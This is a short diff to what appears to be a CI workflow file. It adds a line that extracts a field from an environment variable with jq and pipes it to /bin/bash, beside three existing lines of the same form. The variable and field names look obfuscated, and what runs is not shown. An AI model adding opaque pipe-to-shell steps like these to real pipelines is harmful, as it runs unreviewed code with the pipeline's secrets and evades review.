@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$ep09" | jq -r .pz3430 | /bin/bash
           echo $gfwpk7 | jq -r .ofss348 | /bin/bash
           echo $zge8671 | jq -r .zkue058 | /bin/bash
+          echo $mmw490 | jq -r .eeac087 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
